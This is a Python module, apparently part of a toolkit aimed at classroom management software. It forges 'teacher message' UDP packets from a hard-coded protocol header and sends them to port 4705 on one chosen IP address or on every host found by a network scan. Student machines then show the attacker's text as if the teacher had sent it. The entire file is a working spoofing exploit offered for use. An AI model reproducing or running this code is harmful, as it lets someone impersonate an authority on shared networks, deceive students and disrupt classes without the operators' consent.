import ctypes
import threading
import time
from utils import UtilsManager as utils
from utils.impl.ConfigManager import config
from utils.impl.ErrorHandler import handle_exception, ValidationError, NetworkError

TARGET_PORT = config.get("target_port", 4705)

@handle_exception(SystemError, default_return=None, error_message="Failed to send teacher message")
def _handle_send_teacher_message():
    """
    处理发送教师消息的选项
    收集目标IP和消息内容，然后启动线程发送消息
    """
    import signal

    # 依旧是Coco写的神秘代码，效果是学生端看到老师发来的消息
    utils.info("Where would you like to send it?(eg. 192.168.153.130)")
    utils.info("If you dont input any args, it will send to all ips.")
    module3_choice = input("[IP](Default All): ")
    module3_text = input("[Text]: ")

    # 验证输入
    if not module3_text:
        utils.error("Message text cannot be empty")
        raise ValidationError("Message text cannot be empty")

    # 如果用户输入为空，默认设置为 "all"
    if not module3_choice.strip():
        module3_choice = "all"

    # 设置信号处理器以确保Ctrl+C能被正确捕获
    def signal_handler(signum, frame):
        raise KeyboardInterrupt()

    original_handler = signal.signal(signal.SIGINT, signal_handler)

    try:
        Thread = threading.Thread(target=module3_main, args=(module3_choice, module3_text), daemon=True)
        Thread.start()

        # 等待用户中断或线程结束
        try:
            while Thread.is_alive():
                time.sleep(0.1)  # 减少睡眠时间以便更快响应Ctrl+C
        except KeyboardInterrupt:
            utils.info("\nStopping message sending...")
            # module3_main 会自动处理 KeyboardInterrupt
            Thread.join(timeout=2)  # 等待线程结束，最多2秒
            if Thread.is_alive():
                utils.warn("Message sending did not stop gracefully")
            else:
                utils.info("Message sending stopped!")
            # 不重新抛出KeyboardInterrupt，让用户返回主菜单
    except KeyboardInterrupt:
        # 捕获KeyboardInterrupt，确保能退出到主菜单
        utils.info("\nOperation cancelled by user.")
    except Exception as e:
        utils.error(f"Failed to start message sending thread: {e}")
        raise SystemError(f"Failed to start message sending thread: {e}")
    finally:
        # 恢复原始信号处理器
        signal.signal(signal.SIGINT, original_handler)


def module3_main(choice, text):
    """
    发送教师消息模块的主函数

    Args:
        choice (str): 目标IP地址，空字符串或"all"表示发送给所有IP
        text (str): 要发送的消息内容
    """
    try:
        # 处理用户输入的"all"或空字符串，都表示发送给所有IP
        if choice == "" or choice.lower() == "all":
            ip_list = utils.ip_scanner()
            if ip_list and len(ip_list) > 0:  # 确保列表不为空且有效
                for i in ip_list:
                    # 检查是否应该继续运行
                    # 确保IP地址格式正确
                    if i and len(i) >= 1 and i[0]:
                        ips = i[0]
                        # 验证IP地址格式
                        if _is_valid_ip(ips):
                            utils.info(f"Sending message:[{text}]...")
                            send_teacher_message(text, ips)
                        else:
                            utils.warn(f"Invalid IP address format: {ips}")
                    else:
                        utils.warn(f"Invalid IP format: {i}")
                utils.info("Finished.")
            else:
                utils.warn("No active hosts found. Message not sent.")
        else:
            ips = choice
            # 验证IP地址格式
            if _is_valid_ip(ips):
                utils.info(f"Sending message:[{text}]...")
                send_teacher_message(text, ips)
            else:
                utils.error(f"Invalid IP address format: {ips}")
                raise ValidationError(f"Invalid IP address format: {ips}")
    except KeyboardInterrupt:
        utils.info("Message sending interrupted by user.")
    except ValidationError:
        # 重新抛出ValidationError，让上层处理
        raise
    except Exception as e:
        utils.error(f"Error in module3_main: {e}")
        import traceback
        traceback.print_exc()


def _is_valid_ip(ip):
    """
    验证IP地址格式是否正确

    Args:
        ip (str): 要验证的IP地址

    Returns:
        bool: IP地址格式正确返回True，否则返回False
    """
    try:
        import socket
        import re

        # 确保IP地址不是空字符串
        if not ip or not ip.strip():
            return False

        # 使用正则表达式验证IPv4格式
        ip_pattern = r'^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$'
        match = re.match(ip_pattern, ip.strip())
        if not match:
            return False

        # 检查每个部分是否在0-255范围内
        for part in match.groups():
            num = int(part)
            if num < 0 or num > 255:
                return False

        # 使用socket.inet_aton进行最终验证
        socket.inet_aton(ip.strip())
        return True
    except socket.error:
        return False
    except ValueError:
        return False
    except Exception:
        return False


@handle_exception(NetworkError, default_return=False, error_message="Failed to send teacher message")
def send_teacher_message(text, target_ip, target_port=TARGET_PORT):
    """
    以老师身份发送消息到指定IP

    Args:
        text (str): 要发送的消息内容
        target_ip (str): 目标IP地址
        target_port (int): 目标端口，默认为4705

    Returns:
        bool: 发送成功返回True，失败返回False
    """
    # 验证IP地址格式
    try:
        import socket
        socket.inet_aton(target_ip)
    except socket.error as e:
        utils.error(f"[-] Invalid IP address format: {target_ip} - {e}")
        return False
    except Exception as e:
        utils.error(f"[-] Error validating IP address {target_ip}: {e}")
        return False

    # 创建UDP套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(config.get("timeout", 5))  # 从配置管理器获取超时时间

    # 获取教师消息数据包
    try:
        payload = _get_teacher_message_payload(text)
    except Exception as e:
        utils.error(f"[-] Failed to create message payload: {e}")
        sock.close()
        return False

    # 目标地址和端口
    target_addr = (target_ip, target_port)

    try:
        # 发送数据包
        sock.sendto(payload, target_addr)
        utils.info(f"[+] Sent to {target_ip}:{target_port} (send_teacher_message)")
        return True
    except socket.timeout:
        utils.error(f"[-] Timeout while sending teacher message to {target_ip}:{target_port}")
        return False
    except socket.error as e:
        # 详细记录不同类型的socket错误
        if "getaddrinfo failed" in str(e):
            utils.error(f"[-] DNS resolution failed for {target_ip}: {e}")
        elif "Connection refused" in str(e):
            utils.error(f"[-] Connection refused by {target_ip}:{target_port}")
        elif "Network is unreachable" in str(e):
            utils.error(f"[-] Network is unreachable for {target_ip}")
        else:
            utils.error(f"[-] Socket error while sending teacher message to {target_ip}: {e}")
        return False
    except Exception as e:
        utils.error(f"[-] Failed to send to {target_ip}: {e}")
        return False
    finally:
        sock.close()


def _get_teacher_message_payload(text):
    """
    获取教师消息数据包

    Args:
        text (str): 要发送的消息内容

    Returns:
        bytearray: 教师消息数据包

    Raises:
        ValueError: 当数据包长度不正确时抛出异常
    """
    # 使用预定义的常量字节数组，避免重复创建
    header = bytes([
        0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00,
        0x01, 0x00, 0x9e, 0x03, 0x00, 0x00, 0xac, 0x31, 0x67, 0xfc, 0x4c, 0x74, 0x11, 0x4d, 0xa7, 0x42,
        0x60, 0x84, 0xf9, 0x3e, 0x40, 0x3c, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x99, 0x81, 0x91, 0x03,
        0x00, 0x00, 0x91, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00,
        0x00, 0x00
    ])
    tail = bytes([
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x0a, 0x00
    ])

    # 预计算长度，减少重复调用
    max_message_length = config.get("max_message_length", 954)
    max_middle_length = max_message_length - len(header) - len(tail)

    # 优化文本转换，直接在目标字节数组中操作
    middle_data = _text_to_bytearray(text, max_middle_length)

    # 预分配最终数组大小，避免多次内存重分配
    payload = bytearray(len(header) + len(middle_data) + len(tail))
    payload[0:len(header)] = header
    payload[len(header):len(header) + len(middle_data)] = middle_data
    payload[len(header) + len(middle_data):] = tail

    # 验证数据包长度
    if len(payload) != max_message_length:
        utils.error(f"[-] pack lenth err: lenth{len(payload)}，should be {max_message_length}")
        raise ValueError(f"pack lenth err: lenth{len(payload)}，should be {max_message_length}")

    # 修改第19字节为GetTickCount()低8位
    payload[19] = ctypes.windll.kernel32.GetTickCount() & 0xFF

    return payload


def _text_to_bytearray(text, max_length):
    """
    将文本转换为字节数组，优化性能

    Args:
        text (str): 要转换的文本
        max_length (int): 最大长度

    Returns:
        bytearray: 转换后的字节数组
    """
    if not text:
        return bytearray(max_length)

    # 直接编码为UTF-16-LE，避免逐字符处理
    encoded = text.encode('utf-16-le')

    # 确保不超过最大长度
    if len(encoded) > max_length:
        encoded = encoded[:max_length]

    # 创建指定长度的字节数组并复制数据
    result = bytearray(max_length)
    result[:len(encoded)] = encoded

    return result